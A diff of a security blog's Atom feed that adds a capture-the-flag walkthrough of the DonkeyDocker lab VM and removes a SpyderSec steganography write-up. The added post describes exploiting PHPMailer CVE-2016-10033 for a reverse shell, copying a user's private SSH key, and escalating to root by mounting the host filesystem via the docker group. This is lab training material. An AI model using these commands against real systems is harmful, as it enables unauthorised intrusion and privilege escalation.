@@ -4,7 +4,7 @@
   <title><![CDATA[Category: writeups | Core dump overflow]]></title>
   <link href="http://chousensha.github.io/blog/categories/writeups/atom.xml" rel="self"/>
   <link href="http://chousensha.github.io/"/>
-  <updated>2019-04-07T22:48:04+03:00</updated>
+  <updated>2019-04-15T21:12:12+03:00</updated>
   <id>http://chousensha.github.io/</id>
   <author>
     <name><![CDATA[chousensha]]></name>
@@ -12,6 +12,344 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Donkey Docker]]></title>
+    <link href="http://chousensha.github.io/blog/2019/04/15/donkey-docker/"/>
+    <updated>2019-04-15T21:02:36+03:00</updated>
+    <id>http://chousensha.github.io/blog/2019/04/15/donkey-docker</id>
+    <content type="html"><![CDATA[<p>Today&rsquo;s target is called DonkeyDocker, so we should expect a Docker component! The level is intermediate to hard.</p>
+
+<!-- more -->
+
+
+<p><code>
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.5 (protocol 2.0)
+| ssh-hostkey:
+|   2048 9c:38:ce:11:9c:b2:7a:48:58:c9:76:d5:b8:bd:bd:57 (RSA)
+|   256 d7:5e:f2:17:bd:18:1b:9c:8c:ab:11:09:e8:a0:00:c2 (ECDSA)
+|_  256 06:f0:0c:d8:bc:9b:21:95:a5:d2:70:39:08:57:b3:07 (ED25519)
+80/tcp open  http    Apache httpd 2.4.10 ((Debian))
+| http-robots.txt: 3 disallowed entries
+|_/contact.php /index.php /about.php
+|_http-server-header: Apache/2.4.10 (Debian)
+|_http-title: Docker Donkey
+</code></p>
+
+<p>Not much to work with, let&rsquo;s hit the web server first. Nothing interesting on the home page and the contact page d, but going to the about page gives an error that something went wrong.</p>
+
+<p>In the HTML source, I found a comment:</p>
+
+<p>``` html</p>
+
+<!-- FIXME!: www-path: /www -->
+
+
+<p>```</p>
+
+<p>Didn&rsquo;t find such a path with my enumeration. I fired up Gobuster next:</p>
+
+<p><code>
+gobuster -u http://192.168.159.132/ -w /usr/share/wordlists/dirb/big.txt -q -t 20
+/.htpasswd (Status: 403)
+/.htaccess (Status: 403)
+/about (Status: 200)
+/assets (Status: 301)
+/contact (Status: 200)
+/css (Status: 301)
+/dist (Status: 301)
+/index (Status: 200)
+/mailer (Status: 301)
+/robots.txt (Status: 200)
+/server-status (Status: 403)
+</code></p>
+
+<p>Trying those folders gave me 403 errors, so the next thing I did was to enumerate those folders themselves, and got an interesting hit with the /mailer folder:</p>
+
+<p><code>
+gobuster -u http://192.168.159.132/mailer -w /usr/share/wordlists/dirb/big.txt -q -t 20
+/.htpasswd (Status: 403)
+/.htaccess (Status: 403)
+/LICENSE (Status: 200)
+/docs (Status: 301)
+/examples (Status: 301)
+/extras (Status: 301)
+/language (Status: 301)
+/test (Status: 301)
+</code></p>
+
+<p>Going to /mailer/examples/ reveals a PHPMailer installation. From the Github files, it should also have a VERSION file, so I went to <a href="http://192.168.159.132/mailer/VERSION">http://192.168.159.132/mailer/VERSION</a> and was rewarded with the version number: 5.2.16. I found a Metasploit exploit:</p>
+
+<blockquote><p>PHPMailer versions up to and including 5.2.19 are affected by a
+ vulnerability which can be leveraged by an attacker to write a file
+ with partially controlled contents to an arbitrary location through
+ injection of arguments that are passed to the sendmail binary. This
+ module writes a payload to the web root of the webserver before then
+ executing it with an HTTP request. The user running PHPMailer must
+ have write access to the specified WEB_ROOT directory and successful
+ exploitation can take a few minutes.</p></blockquote>
+
+<p>This one didn&rsquo;t work for me, so I found another one with <a href="https://www.exploit-db.com/exploits/40974">searchsploit</a>. To make it work, I had to install requests_toolbelt and delete the banner that was giving an encoding error. Inside the code I changed the IP and port in the payload and added the target URL:</p>
+
+<p><code>python
+target = 'http://192.168.159.132/contact'
+</code></p>
+
+<p>Per the <a href="https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html">advisory</a>:</p>
+
+<blockquote><p>To exploit the vulnerability an attacker could target common website
+components such as contact/feedback forms, registration forms, password
+email resets and others that send out emails with the help of a vulnerable
+version of the PHPMailer class.</p></blockquote>
+
+<p>After finishing the modifications, I ran it:</p>
+
+<p>``` plain
+PHPMailer Exploit CVE 2016-10033 &ndash; anarcoder at protonmail.com
+Version 1.0 &ndash; github.com/anarcoder &ndash; greetings opsxcq &amp; David Golunski</p>
+
+<p>[+] SeNdiNG eVIl SHeLL To TaRGeT&hellip;.
+[+] SPaWNiNG eVIL sHeLL&hellip;.. bOOOOM :D
+```</p>
+
+<p>With a listener on, I went to <a href="http://192.168.159.132/backdoor">http://192.168.159.132/backdoor</a> and got a reverse shell:</p>
+
+<p><code>
+nc -vnlp 9000
+listening on [any] 9000 ...
+connect to [192.168.159.129] from (UNKNOWN) [192.168.159.132] 50930
+/bin/sh: 0: can't access tty; job control turned off
+$ python -c 'import pty; pty.spawn("/bin/bash")'
+www-data@12081bd067cc:/www$
+</code></p>
+
+<p>From the hostname, we seem to be inside a Docker container. In the root directory I found a script:</p>
+
+<p>```
+www-data@12081bd067cc:/www$ cat /main.sh
+cat /main.sh</p>
+
+<h1>!/bin/bash</h1>
+
+<h1>change permission</h1>
+
+<p>chown smith:users /home/smith/flag.txt</p>
+
+<h1>Start apache</h1>
+
+<p>source /etc/apache2/envvars
+a2enmod rewrite
+apachectl -f /etc/apache2/apache2.conf</p>
+
+<p>sleep 3
+tail -f /var/log/apache2/*&amp;</p>
+
+<h1>Start our fake smtp server</h1>
+
+<p>python -m smtpd -n -c DebuggingServer localhost:25
+```</p>
+
+<p>Interesting, there is a flag available for user smith. I switched to this user and tried the password smith and it worked:</p>
+
+<p>```
+smith@12081bd067cc:~$ ls -al
+ls -al
+total 28
+drwx&mdash;&mdash;&mdash; 1 smith users 4096 Mar 26  2017 .
+drwxr-xr-x 1 root  root  4096 Mar 26  2017 ..
+-rw-r&mdash;r&mdash; 1 smith users  220 Nov  5  2016 .bash_logout
+-rw-r&mdash;r&mdash; 1 smith users 3515 Nov  5  2016 .bashrc
+-rw-r&mdash;r&mdash; 1 smith users  675 Nov  5  2016 .profile
+drwx&mdash;S&mdash;&ndash; 2 smith users 4096 Mar 22  2017 .ssh
+-rw-r&mdash;r&mdash; 1 smith users  237 Mar 22  2017 flag.txt
+smith@12081bd067cc:~$ cat flag.txt
+cat flag.txt
+This is not the end, sorry dude. Look deeper!
+I know nobody created a user into a docker
+container but who cares? ;&ndash;)</p>
+
+<p>But good work!
+Here a flag for you: flag0{9fe3ed7d67635868567e290c6a490f8e}</p>
+
+<p>PS: I like 1984 written by George ORWELL
+```</p>
+
+<p>Inside smith&rsquo;s home we also have a .ssh folder. Inside we have a pair of private-public keys.</p>
+
+<p><code>
+-rwx------ 1 smith users  411 Mar 22  2017 id_ed25519
+-rwx------ 1 smith users  101 Mar 22  2017 id_ed25519.pub
+smith@12081bd067cc:~/.ssh$ cat id_ed25519.pub
+cat id_ed25519.pub
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICEBBzcffpLILgXqY77+z7/Awsovz/jkhOd/0fDjvEof orwell@donkeydocker
+</code></p>
+
+<p>And the SSH user is orwell. So let&rsquo;s copy the private key to our machine and try to SSH in as orwell:</p>
+
+<p>```
+ssh -i id_ed25519 <a href="&#x6d;&#97;&#x69;&#x6c;&#x74;&#x6f;&#x3a;&#x6f;&#114;&#119;&#101;&#108;&#108;&#x40;&#x31;&#57;&#50;&#x2e;&#49;&#54;&#56;&#x2e;&#x31;&#x35;&#x39;&#x2e;&#49;&#x33;&#x32;">&#x6f;&#x72;&#119;&#101;&#108;&#x6c;&#x40;&#49;&#x39;&#50;&#46;&#x31;&#54;&#x38;&#46;&#49;&#53;&#57;&#46;&#x31;&#51;&#50;</a>
+Welcome to</p>
+
+<hr />
+
+<p> |   \ <strong><em> _ _ | |</em></strong><strong> _  <em>|   \ </em></strong>  <strong>| |</strong><strong><em> _ _
+ | |) / _ \ &lsquo; \| / / &ndash;</em>) || | |) / _ \/ <em>| / / &ndash;</em>) &rsquo;<em>|
+ |</em></strong>/_<strong>/<em>||</em>|___</strong>|_, |<em><strong>/_</strong>/_</em>|<em>____|</em>|</p>
+
+<pre><code>                    |__/
+                         Made with &lt;3 v.1.0 - 2017
+</code></pre>
+
+<p>This is my first boot2root &ndash; CTF VM. I hope you enjoy it.
+if you run into any issue you can find me on Twitter: @dhn_
+or feel free to write me a mail to:</p>
+
+<ul>
+<li>Email: <a href="&#x6d;&#x61;&#x69;&#108;&#116;&#111;&#58;&#100;&#104;&#110;&#x40;&#122;&#101;&#114;&#48;&#x2d;&#100;&#x61;&#x79;&#46;&#112;&#x77;">&#x64;&#104;&#x6e;&#x40;&#x7a;&#x65;&#114;&#x30;&#x2d;&#100;&#x61;&#x79;&#46;&#x70;&#x77;</a></li>
+<li>GPG key: 0x2641123C</li>
+<li>GPG fingerprint: 4E3444A11BB780F84B58E8ABA8DD99472641123C</li>
+</ul>
+
+
+<p>Level:       I think the level of this boot2root challange</p>
+
+<pre><code>         is hard or intermediate.
+</code></pre>
+
+<p>Try harder!: If you are confused or frustrated don&rsquo;t forget</p>
+
+<pre><code>         that enumeration is the key!
+</code></pre>
+
+<p>Thanks:      Special thanks to @1nternaut for the awesome</p>
+
+<pre><code>         CTF VM name!
+</code></pre>
+
+<p>Feedback:    This is my first boot2root &ndash; CTF VM, please</p>
+
+<pre><code>         give me feedback on how to improve!
+</code></pre>
+
+<p>Looking forward to the write-ups!</p>
+
+<p>donkeydocker:~$
+```</p>
+
+<p>It worked! In orwell&rsquo;s home we find another flag:</p>
+
+<p>```
+donkeydocker:~$ ls -al /home/orwell
+total 24
+drwxr-sr-x    3 orwell   orwell        4096 Mar 26  2017 .
+drwxr-xr-x    3 root     root          4096 Mar 22  2017 ..
+-rw-r&mdash;r&mdash;    1 root     orwell           1 Mar 26  2017 .ash
+-rw&mdash;&mdash;&mdash;&ndash;    1 orwell   orwell          45 Apr 15 18:12 .ash_history
+drwx&mdash;S&mdash;&ndash;    2 orwell   users         4096 Mar 22  2017 .ssh
+-rw-r&mdash;r&mdash;    1 orwell   orwell         104 Mar 22  2017 flag.txt
+donkeydocker:~$ cat flag.txt
+You tried harder! Good work ;&ndash;)</p>
+
+<p>Here a flag for your effort: flag01{e20523853d6733721071c2a4e95c9c60}
+```</p>
+
+<p>Now we seem to be on the Docker host itself. Let&rsquo;s confirm:</p>
+
+<p><code>
+donkeydocker:~$ docker ps
+CONTAINER ID        IMAGE               COMMAND              CREATED             STATUS              PORTS                NAMES
+12081bd067cc        donkeydocker        "/main.sh default"   2 years ago         Up 4 hours          0.0.0.0:80-&gt;80/tcp   donkeydocker
+</code></p>
+
+<p>We can see the container we were in previously. Now, for the next step, I used as reference this blog post about <a href="https://fosterelli.co/privilege-escalation-via-docker.html">Docker privilege escalation</a>. The highlights are :</p>
+
+<blockquote><p>If you happen to have gotten access to a user-account on a machine, and that user is a member of the ‘docker’ group, running the following command will give you a root shell:
+docker run -v /:/hostOS -i -t chrisfosterelli/rootplease</p>
+
+<p>The command you run to perform the privilege escalation fetches my Docker image from the Docker Hub Registry and runs it. The -v parameter that you pass to Docker specifies
+that you want to create a volume in the Docker instance. The -i and -t parameters put Docker into ‘shell mode’ rather than starting a daemon process.</p>
+
+<p>The instance is set up to mount the root filesystem of the host machine to the instance’s volume, so when the instance starts it immediately loads a chroot into that volume.
+This effectively gives you root on the machine.</p></blockquote>
+
+<p>And if we look at the groups that orwell is a part of, we can see that he is indeed a member of the docker group:</p>
+
+<p><code>
+donkeydocker:~$ id
+uid=1000(orwell) gid=1000(orwell) groups=101(docker),1000(orwell)
+</code></p>
+
+<p>Let&rsquo;s look at the available containers now:</p>
+
+<p><code>
+donkeydocker:~$ docker container ls
+CONTAINER ID        IMAGE               COMMAND              CREATED             STATUS              PORTS                NAMES
+12081bd067cc        donkeydocker        "/main.sh default"   2 years ago         Up 32 minutes       0.0.0.0:80-&gt;80/tcp   donkeydocker
+</code></p>
+
+<p>We can create a new container in the background which is based on the donkeydocker one and mount the host filesystem in it:</p>
+
+<p><code>
+donkeydocker:~$ docker run -d -v /:/host donkeydocker
+103cd9c625b0cf04e1ed173d95e56724051a708300a07d75c20618472eefe863
+</code></p>
+
+<p>Now we should find the host / contents in the /host directory inside the container. Let&rsquo;s verify that it was created:</p>
+
+<p><code>
+donkeydocker:~$ docker container ls
+CONTAINER ID        IMAGE               COMMAND              CREATED             STATUS              PORTS                NAMES
+103cd9c625b0        donkeydocker        "/main.sh default"   4 seconds ago       Up 3 seconds        80/tcp               epic_lovelace
+12081bd067cc        donkeydocker        "/main.sh default"   2 years ago         Up 34 minutes       0.0.0.0:80-&gt;80/tcp   donkeydocker
+</code></p>
+
+<p>And now we can run a root shell inside the container and read the host flag:</p>
+
+<p>```
+donkeydocker:~$ docker exec -i -t 103cd9c625b0 /bin/bash
+root@103cd9c625b0:/# ls /host/root
+donkeydocker  flag.txt
+root@103cd9c625b0:/# cat /host/root/flag.txt
+YES!! You did it :&ndash;). Congratulations!</p>
+
+<p>I hope you enjoyed this CTF VM.</p>
+
+<p>Drop me a line on twitter @dhn_, or via email <a href="&#x6d;&#x61;&#x69;&#x6c;&#x74;&#111;&#x3a;&#x64;&#104;&#110;&#x40;&#x7a;&#x65;&#x72;&#x30;&#45;&#x64;&#97;&#121;&#46;&#x70;&#x77;">&#x64;&#104;&#x6e;&#x40;&#x7a;&#101;&#x72;&#x30;&#x2d;&#100;&#97;&#x79;&#x2e;&#x70;&#x77;</a></p>
+
+<p>Here is your flag: flag2{60d14feef575bacf5fd8eb06ec7cd8e7}
+```</p>
+
+<p>Nice Docker twist on this VM! To recap the steps:</p>
+
+<ul>
+<li>Web directory enumeration revealed a vulnerable PHPMailer installation that gave a shell as the www-data</li>
+<li>the shell was inside a docker container. A script placed in the root filesystem revealed a smith user that had the username as password</li>
+<li>the smith user had the SSH keys for a user orwell on the host and we were able to SSH directly as that user with the private key</li>
+<li>user orwell was member of the docker group and it was possible to escalate privileges by mounting the root filesystem inside a container</li>
+</ul>
+
+
+<p>```</p>
+
+<hr />
+
+<p>/ Your motives for doing whatever good \
+| deed you may have in mind will be    |
+\ misinterpreted by somebody.          /</p>
+
+<hr />
+
+<pre><code>    \   ^__^
+     \  (oo)\_______
+        (__)\       )\/\
+            ||----w |
+            ||     ||
+</code></pre>
+
+<p>```</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Hackfest 2016 Orcus]]></title>
@@ -458,7 +796,7 @@ LIST
 .
 RETR 1
 +OK 544 octets
-Return-Path: <a href="&#109;&#x61;&#x69;&#x6c;&#116;&#111;&#x3a;&#x72;&#111;&#x6f;&#116;&#x40;&#49;&#50;&#55;&#x2e;&#48;&#x2e;&#x30;&#46;&#49;&#x2e;&#103;&#111;&#x6c;&#x64;&#x65;&#110;&#x65;&#121;&#x65;">&#x72;&#x6f;&#111;&#116;&#64;&#x31;&#x32;&#x37;&#x2e;&#x30;&#46;&#48;&#x2e;&#49;&#46;&#103;&#111;&#x6c;&#x64;&#101;&#x6e;&#x65;&#121;&#x65;</a>
+Return-Path: <a href="&#109;&#97;&#x69;&#108;&#x74;&#111;&#x3a;&#x72;&#x6f;&#111;&#116;&#x40;&#49;&#50;&#55;&#x2e;&#x30;&#x2e;&#48;&#46;&#49;&#46;&#103;&#x6f;&#108;&#100;&#101;&#x6e;&#101;&#x79;&#101;">&#114;&#111;&#x6f;&#x74;&#x40;&#x31;&#50;&#55;&#46;&#48;&#46;&#48;&#46;&#x31;&#46;&#103;&#111;&#x6c;&#100;&#x65;&#110;&#x65;&#x79;&#x65;</a>
 X-Original-To: boris
 Delivered-To: boris@ubuntu
 Received: from ok (localhost [127.0.0.1])</p>
@@ -469,7 +807,7 @@ for &lt;boris&gt;; Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
 
 <p>Message-Id: &lt;20180425022326.D9E47454B1@ubuntu>
 Date: Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
-From: <a href="&#109;&#97;&#105;&#x6c;&#x74;&#111;&#58;&#x72;&#111;&#111;&#x74;&#64;&#x31;&#x32;&#x37;&#x2e;&#48;&#x2e;&#x30;&#x2e;&#x31;&#46;&#103;&#111;&#x6c;&#x64;&#101;&#x6e;&#101;&#x79;&#101;">&#x72;&#x6f;&#x6f;&#116;&#64;&#x31;&#50;&#x37;&#x2e;&#48;&#x2e;&#x30;&#46;&#49;&#x2e;&#x67;&#111;&#108;&#100;&#x65;&#110;&#101;&#x79;&#101;</a></p>
+From: <a href="&#x6d;&#x61;&#x69;&#108;&#x74;&#x6f;&#58;&#114;&#x6f;&#x6f;&#x74;&#64;&#49;&#x32;&#x37;&#46;&#48;&#x2e;&#48;&#46;&#49;&#x2e;&#103;&#x6f;&#108;&#x64;&#101;&#110;&#101;&#x79;&#101;">&#x72;&#111;&#x6f;&#x74;&#64;&#49;&#x32;&#55;&#x2e;&#48;&#x2e;&#48;&#46;&#49;&#x2e;&#103;&#111;&#108;&#x64;&#x65;&#x6e;&#101;&#x79;&#101;</a></p>
 
 <p>Boris, this is admin. You can electronically communicate to co-workers and students here. I&rsquo;m not going to scan emails for security risks because I trust you and the other admins here.
 .
@@ -492,7 +830,7 @@ From: natalya@ubuntu</p>
 .
 RETR 3
 +OK 921 octets
-Return-Path: <a href="&#109;&#x61;&#105;&#x6c;&#x74;&#x6f;&#x3a;&#97;&#108;&#101;&#99;&#x40;&#106;&#97;&#110;&#x75;&#x73;&#x2e;&#x62;&#x6f;&#x73;&#115;">&#97;&#x6c;&#101;&#99;&#x40;&#106;&#x61;&#110;&#117;&#x73;&#x2e;&#x62;&#111;&#x73;&#115;</a>
+Return-Path: <a href="&#109;&#97;&#105;&#x6c;&#116;&#x6f;&#x3a;&#x61;&#x6c;&#101;&#99;&#x40;&#x6a;&#x61;&#x6e;&#117;&#x73;&#46;&#98;&#x6f;&#x73;&#x73;">&#97;&#x6c;&#101;&#x63;&#64;&#x6a;&#x61;&#110;&#x75;&#x73;&#46;&#x62;&#111;&#x73;&#115;</a>
 X-Original-To: boris
 Delivered-To: boris@ubuntu
 Received: from janus (localhost [127.0.0.1])</p>
@@ -503,7 +841,7 @@ for &lt;boris&gt;; Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
 
 <p>Message-Id: &lt;20180425025235.4B9F4454B1@ubuntu>
 Date: Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
-From: <a href="&#x6d;&#x61;&#x69;&#108;&#116;&#111;&#58;&#97;&#108;&#x65;&#x63;&#64;&#106;&#97;&#x6e;&#117;&#115;&#x2e;&#x62;&#x6f;&#115;&#x73;">&#97;&#108;&#101;&#x63;&#64;&#x6a;&#x61;&#x6e;&#x75;&#115;&#46;&#98;&#111;&#115;&#115;</a></p>
+From: <a href="&#x6d;&#97;&#x69;&#108;&#x74;&#x6f;&#x3a;&#97;&#108;&#x65;&#99;&#x40;&#106;&#x61;&#110;&#x75;&#x73;&#x2e;&#x62;&#111;&#115;&#115;">&#x61;&#108;&#x65;&#x63;&#64;&#106;&#x61;&#x6e;&#117;&#x73;&#46;&#98;&#x6f;&#x73;&#x73;</a></p>
 
 <p>Boris,</p>
 
@@ -1193,7 +1531,7 @@ computer         (w1r3s)
 <p>With this, I could SSH in.</p>
 
 <p>```
-ssh <a href="&#109;&#x61;&#x69;&#108;&#116;&#x6f;&#58;&#x77;&#49;&#x72;&#x33;&#x73;&#64;&#49;&#x39;&#x32;&#46;&#49;&#x36;&#x38;&#46;&#49;&#52;&#x35;&#46;&#x31;&#x33;&#52;">&#x77;&#49;&#x72;&#51;&#x73;&#64;&#49;&#x39;&#x32;&#46;&#49;&#x36;&#x38;&#46;&#x31;&#x34;&#53;&#46;&#x31;&#x33;&#52;</a>
+ssh <a href="&#109;&#x61;&#x69;&#x6c;&#x74;&#111;&#x3a;&#x77;&#49;&#x72;&#51;&#115;&#64;&#x31;&#57;&#x32;&#46;&#49;&#54;&#x38;&#46;&#x31;&#x34;&#53;&#x2e;&#49;&#51;&#x34;">&#x77;&#x31;&#114;&#x33;&#115;&#64;&#49;&#57;&#50;&#46;&#x31;&#x36;&#x38;&#x2e;&#x31;&#x34;&#53;&#x2e;&#49;&#x33;&#x34;</a>
 The authenticity of host &lsquo;192.168.145.134 (192.168.145.134)&rsquo; can&rsquo;t be established.
 ECDSA key fingerprint is SHA256:/3N0PzPMqtXlj9QWJFMbCufh2W95JylZ/oF82NkAAto.
 Are you sure you want to continue connecting (yes/no)? yes</p>
@@ -1204,7 +1542,7 @@ Are you sure you want to continue connecting (yes/no)? yes</p>
 
 <h2>Well,&hellip;&hellip;..possibly.</h2>
 
-<p><a href="&#109;&#97;&#105;&#x6c;&#x74;&#x6f;&#x3a;&#119;&#x31;&#x72;&#x33;&#x73;&#64;&#x31;&#57;&#50;&#x2e;&#x31;&#x36;&#56;&#46;&#x31;&#x34;&#53;&#46;&#x31;&#51;&#52;">&#119;&#x31;&#x72;&#51;&#115;&#x40;&#x31;&#x39;&#x32;&#46;&#x31;&#54;&#56;&#46;&#x31;&#52;&#53;&#x2e;&#x31;&#x33;&#52;</a>&rsquo;s password:
+<p><a href="&#x6d;&#97;&#x69;&#108;&#x74;&#x6f;&#x3a;&#x77;&#x31;&#x72;&#51;&#115;&#x40;&#x31;&#x39;&#x32;&#46;&#x31;&#54;&#56;&#46;&#x31;&#x34;&#x35;&#46;&#49;&#51;&#x34;">&#x77;&#x31;&#114;&#51;&#x73;&#x40;&#49;&#x39;&#x32;&#x2e;&#49;&#54;&#56;&#x2e;&#x31;&#52;&#53;&#46;&#x31;&#51;&#x34;</a>&rsquo;s password:
 Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.13.0-36-generic x86_64)</p>
 
 <ul>
@@ -1649,115 +1987,6 @@ a10828bee17db751de4b936614558305
 | sometimes to make it up.              |
 |                                       |
 \ &mdash; Mark Twain, &ldquo;The Innocents Abroad&rdquo; /</p>
-
-<hr />
-
-<pre><code>    \   ^__^
-     \  (oo)\_______
-        (__)\       )\/\
-            ||----w |
-            ||     ||
-</code></pre>
-
-<p>```</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Take the SpyderSec Challenge]]></title>
-    <link href="http://chousensha.github.io/blog/2018/11/10/take-the-spydersec-challenge/"/>
-    <updated>2018-11-10T14:43:09+02:00</updated>
-    <id>http://chousensha.github.io/blog/2018/11/10/take-the-spydersec-challenge</id>
-    <content type="html"><![CDATA[<p>The challenge:</p>
-
-<blockquote><p>You are looking for two flags. Using discovered pointers in various elements of the running web
-application you can deduce the first flag (a downloadable file) which is required to find the second
-flag (a text file). Look, read and maybe even listen. You will need to use basic web application
-recon skills as well as some forensics to find both flags.</p></blockquote>
-
-<!-- more -->
-
-
-<p><code>
-PORT   STATE  SERVICE VERSION
-22/tcp closed ssh
-80/tcp open   http    Apache httpd
-|_http-server-header: Apache
-|_http-title: SpyderSec | Challenge
-</code></p>
-
-<p>There is just one page for the web server:</p>
-
-<p><img class="center" src="/images/pentest/spydersec/spydersec.png" title="&lsquo;spydersec&rsquo; &lsquo;spydersec&rsquo;" ></p>
-
-<p>There is some peculiar Javascript in the source:</p>
-
-<p>```</p>
-
-<script>
-eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('7:0:1:2:8:6:3:5:4:0:a:1:2:d:c:b:f:3:9:e',16,16,'6c|65|72|27|75|6d|28|61|74|29|64|62|66|2e|3b|69'.split('|'),0,{}))
-</script>
-
-
-<p>```</p>
-
-<p>I used an <a href="https://beautifier.io/">online JS beautifier</a> to deobfuscate this to a hex string, which I then decoded to <code>alert(&lsquo;mulder.fbi&rsquo;);</code>. This name is familiar to me from the X-Files. Anyway, not sure about its relevance for now. Moving on with the information gathering, since nothing came out of Nikto or Gobuster, I browsed the page in Burp, and noticed a strange cookie being set:</p>
-
-<p><code>
-Cookie: URI=%2Fv%2F81JHPbvyEQ8729161jd6aKQ0N4%2F
-</code></p>
-
-<p>URL decoding this gave me the value <code>/v/81JHPbvyEQ8729161jd6aKQ0N4/</code> Tried browsing to this and got a 403 Forbidden error. There is some piece of the puzzle missing..so I took the next step and downloaded all the images and ran them through exiftool..and finally got some luck with the Challenge.png image, which had a hex comment:</p>
-
-<p><code>
-Comment                         : 35:31:3a:35:33:3a:34:36:3a:35:37:3a:36:34:3a:35:38:3a:33:35:3a:37:31:3a:36:34:3a:34:35:3a:36:37:3a:36:61:3a:34:65:3a:37:61:3a:34:39:3a:33:35:3a:36:33:3a:33:30:3a:37:38:3a:34:32:3a:34:66:3a:33:32:3a:36:37:3a:33:30:3a:34:61:3a:35:31:3a:33:64:3a:33:64
-</code></p>
-
-<p>Had to hex-decode this 2 times to get a base64 string: <em>QSFWdX5qdEgjNzI5c0xBO2g0JQ==</em>, which I decoded to <code>A!Vu~jtH#729sLA;h4%</code>. This looks like a password, but where to use it?</p>
-
-<p>With the hints from the description, knowing that a file will need to be downloaded, I treated mulder.fbi as a file and tried appending it to the URL path that gave me a forbidden error: <a href="http://192.168.145.141/v/81JHPbvyEQ8729161jd6aKQ0N4/mulder.fbi">http://192.168.145.141/v/81JHPbvyEQ8729161jd6aKQ0N4/mulder.fbi</a></p>
-
-<p>That actually worked and I downloaded the file, which is apparently an MP4:</p>
-
-<p><code>
-file mulder.fbi
-mulder.fbi: ISO Media, MP4 v2 [ISO 14496-14]
-</code></p>
-
-<p>This is a song by The Platters. Since I couldn&rsquo;t use steghide on a video, I googled for MP4 steganography and found this Lifehacker article about <a href="https://lifehacker.com/5771142/embed-a-truecrypt-volume-in-a-playable-video-file">embedding a TrueCrypt volume in a video</a>. I installed Veracrypt and used it to mount the file as a volume, in TrueCrypt mode. At the password prompt, I used the string that I&rsquo;ve decoded earlier, and it served me the volume, with a file called Flag.txt inside!</p>
-
-<p>```
-cat Flag.txt
-Congratulations!</p>
-
-<p>You are a winner.</p>
-
-<p>Please leave some feedback on your thoughts regarding this challenge� Was it fun? Was it hard enough or too easy? What did you like or dislike, what could be done better?</p>
-
-<p><a href="https://www.spydersec.com/feedback">https://www.spydersec.com/feedback</a>
-```</p>
-
-<p>The main takeaways from this challenge for me were the steganography possibilities for video files. Until next time!</p>
-
-<p>```</p>
-
-<hr />
-
-<p>/ Q: How many hardware engineers does it \
-| take to change a light bulb? A: None.  |
-| We&rsquo;ll fix it in software.              |
-|                                        |
-| Q: How many system programmers does it |
-| take to change a light bulb? A: None.  |
-| The application can work around it.    |
-|                                        |
-| Q: How many software engineers does it |
-| take to change a light bulb? A: None.  |
-| We&rsquo;ll document it in the manual.       |
-|                                        |
-| Q: How many tech writers does it take  |
-| to change a light bulb? A: None. The   |
-\ user can figure it out.                /</p>
 
 <hr />
 
